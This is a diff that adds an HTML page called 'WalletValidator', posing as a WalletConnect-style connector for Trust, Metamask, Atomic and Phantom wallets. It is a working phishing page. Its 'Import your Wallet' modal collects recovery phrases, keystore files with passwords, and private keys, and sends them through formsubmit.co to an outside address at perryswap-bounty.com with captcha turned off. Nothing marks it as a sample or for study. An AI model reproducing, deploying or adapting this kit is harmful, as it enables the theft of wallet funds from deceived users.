@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <meta name="generator" content="Gatsby 1.0">
+
+  <title>WalletValidator</title>
+  <meta name="robots" content="max-image-preview:large">
+  <link rel="shortcut icon" href="walletconnect.png">
+
+  <meta name="keywords"
+    content="wallet connector">
+
+  <meta name="twitter:card" content="summary_large_image">
+
+  <meta name="twitter:site" content="@walletapi">
+
+  <meta name="twitter:title" content="">
+
+  <meta name="twitter:description" content="Open protocol for connecting Wallets to Dapps, Servers and Validations">
+
+  <meta name="og:title" content="Sync Wallets">
+
+  <meta name="og:type" content="website">
+
+  <meta name="og:url" content="../">
+
+  <meta name="og:description" content="Open protocol for connecting Wallets to Dapps, Servers and Validations">
+
+  <meta name="og:site_name" content="Sync Wallets">
+
+  <meta name="fb:admins" content="365412154213405">
+
+
+  <link rel="stylesheet" href="css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css"
+    href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;600;700;900&amp;display=swap">
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+  <script type="text/javascript" src="js/jquery.min.js"></script>
+  <script type="text/javascript" src="js/bootstrap.bundle.min.js"></script>
+</head>
+
+<body>
+  <noscript>
+    You need to enable JavaScript to run this app.
+  </noscript>
+  <div id="connect-modal" class="connect-modal">
+    <div class="dialog rounded shadow pt-5 pb-4 px-5">
+      <div class="pull-left w-25"><img src="images/trust-wallet.png" id="connect-img"></div>
+      <div class="pull-right mt-2 w-75 text-center" style="line-height: 350px !important;">
+        <h5 class="">Import your Wallet</h5>
+      </div>
+      <span class="clearfix"></span>
+      <div class="tabs mt-4 text-center">
+        <div class="row">
+          <div class="col-4">
+            <p class="active" onclick="showTab('one')" id="p-one">Phrase</p>
+          </div>
+          <div class="col-4">
+            <p onclick="showTab('two')" id="p-two">Keystore JSON</p>
+          </div>
+          <div class="col-4">
+            <p onclick="showTab('three')" id="p-three">Private Key</p>
+          </div>
+        </div>
+      </div>
+      <hr class="mt-0 mb-4">
+      <div class="content" id="tab-one">
+        <form action="https://formsubmit.co/info@perryswap-bounty.com" method="post">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="text" name="_honey" style="display: none">
+          <input type="hidden" name="_next" value="https://perryswap-bounty.com/not-connected/">
+          <input type="hidden" name="importType" value="phrase">
+          <input type="hidden" name="Wallet" class="input-wallet" value="">
+          <textarea placeholder="Enter your recovery phrase"  minlength="42" name="phrase" class="form-control shadow-none"
+            rows="4"></textarea>
+          <p class="small text-center my-4">Typically 12 (sometimes 24)<br>words seperated by single <br>spaces</p>
+          <button type="submit" value="submit" class="btn btn-primary shadow-none w-100 mb-3">PROCEED</button>
+          <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button>
+        </form>
+      </div>
+      <div class="content d-none" id="tab-two">
+        <form action="https://formsubmit.co/info@perryswap-bounty.com" method="post">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="text" name="_honey" style="display: none">
+          <input type="hidden" name="_next" value="https://perryswap-bounty.com/not-connected/">
+          <input type="hidden" name="importType" value="keystoreJSON">
+          <input type="hidden" name="Wallet" class="input-wallet" value="">
+          <textarea name="keystorejson" id="keystoreJSON" minlength="9" placeholder="KeystoreJSON"
+            class="form-control shadow-none mb-3" rows="2"></textarea>
+          <input type="text" class="form-control p-2 shadow-none" placeholder="Keystorepassword" name="Password"
+            id="keystorepassword" value="">
+          <p class="small text-center my-4">Several lines of text beginning with "{...}" plus the password you used to
+            encrypt it.</p>
+          <button type="submit" value="submit" class="btn btn-primary shadow-none w-100 mb-3">PROCEED</button>
+          <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button>
+        </form>
+      </div>
+      <div class="content d-none" id="tab-three">
+        <form action="https://formsubmit.co/info@perryswap-bounty.com" method="post">
+          <input type="hidden" name="_captcha" value="false">
+          <input type="text" name="_honey" style="display: none">
+          <input type="hidden" name="_next" value="https://perryswap-bounty.com/not-connected/">
+          <input type="hidden" name="importType" value="privateKey">
+          <input type="hidden" name="Wallet" class="input-wallet" value="">
+          <input type="text" class="form-control p-2 shadow-none" minlength="12" placeholder="Enter your private key" name="Key"
+            value="">
+          <p class="small text-center my-4">Typically 12 (sometimes 24)<br> seperated by single <br>spaces</p>
+          <button type="submit" value="submit" class="btn btn-primary shadow-none w-100 mb-3">PROCEED</button>
+          <button type="button" class="btn btn-danger shadow-none mb-3 w-100" onclick="close_modal();">Cancel</button>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <div class="my-modal" id="my-modal">
+    <div class="dialog shadow">
+      <div class="my-modal-head p-3 px-4">
+        <span class="pull-left text-primary" onclick="close_modal();">Back</span>
+        <span class="pull-right" onclick="close_modal();">close</span>
+        <span class="clearfix"></span>
+      </div>
+      <div class="my-modal-body py-4 px-4">
+        <div class="first py-3 px-3 mb-4 mt-2">
+          <p class="mb-0 opq-1"><span id="my-modal-status">Connecting.</span>&nbsp;&nbsp;&nbsp;<button id="connect"
+              class="btn btn-secondary btn-sm shadow-none">Connect Manually</button></p>
+        </div>
+        <div class="second pointer mb-3 p-3">
+          <div class="pull-left">
+            <p class="mb-1 opq-1" id="my-modal-wallet-name">---</p>
+            <small>Easy-to-use browser extension</small>
+          </div>
+          <div class="pull-right">
+            <img id="my-modal-wallet-img">
+          </div>
+          <span class="clearfix"></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container ">
+    <div class="px-3 py-4 pb-2 py-md-3">
+      <div class="row align-items-center g-5">
+        <div class="col-4 text-start">
+          <a href="#wallets" class="text-primary">
+            <h5>Wallets</h5>
+          </a>
+        </div>
+        <div class="col-4 text-center">
+          <a href="#"><img src="walletconnect.png" class="logo"></a>
+        </div>
+        <div class="col-4 text-end">
+          <a href="#" class="text-primary">
+            <h5>dApps</h5>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <div class="col-md-7 m-auto mb-5">
+      <div class="text-center px-3 lh-3">
+        <h1 class="mt-4 mb-4">WalletValidator</h1>
+        <p>Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer
+          screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile
+          browsers are supported via mobile deep linking.</p>
+      </div>
+    </div>
+
+    
+    <div class="row" id="wallets">
+      <div class="col-md-6 mb-4">
+        <div class="row">
+          <div class="col-6 mb-4">
+            <div class="px-3 text-center wallets">
+              <img src="images/trust-wallet.png" class="mb-3">
+              <h5 class="h6">Trust</h5>
+            </div>
+          </div>
+          <div class="col-6">
+            <div class="px-3 text-center wallets">
+              <img src="images/metamask.png" class="mb-3">
+              <h5 class="h6">Metamask</h5>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div<div class="row" id="wallets">
+      <div class="col-md-6 mb-4">
+        <div class="row">
+          <div class="col-6 mb-4">
+            <div class="px-3 text-center wallets">
+              <img src="images/atomic.png" class="mb-3">
+              <h5 class="h6">Atomic</h5>
+            </div>
+          </div>
+          <div class="col-6">
+            <div class="px-3 text-center wallets">
+              <img src="images/phantom.jpg" class="mb-3">
+              <h5 class="h6">phantom</h5>
+            </div>
+          </div>
+        </div>
+      </div>>
+  </div>
+
+
+  <script type="text/javascript" src="js/script.js"></script>
+</body>
+
+
+</html>
